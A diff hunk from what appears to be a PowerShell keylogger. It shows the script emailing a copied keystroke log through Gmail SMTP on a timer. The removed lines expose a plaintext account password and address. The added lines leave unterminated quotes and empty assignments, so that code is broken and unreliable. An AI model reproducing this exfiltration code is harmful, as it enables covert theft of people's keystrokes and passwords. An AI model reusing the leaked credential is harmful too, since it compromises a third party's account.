@@ -65,11 +65,11 @@ Register-ObjectEvent -InputObject $EmailTimer -EventName Elapsed -Action {
 
         Copy-Item -Path $logFile -Destination $tempCopy -Force
 
-        $smtpServer = "smtp.gmail.com"
-        $smtpFrom   = "testingKL250@gmail.com"
-        $smtpTo     = "testingKL250@gmail.com"
-        $smtpUser   = "testingKL250@gmail.com"
-        $smtpPass   = "Carsnick8*"  # Make sure this is an App Password
+        $smtpServer = 
+        $smtpFrom   = 
+        $smtpTo     = "
+        $smtpUser   = "
+        $smtpPass   =  # Make sure this is an App Password
         $subject    = "Keylog Report - $(Get-Date -Format 'g')"
         $body       = "Attached are the recent Keystrokes"
 
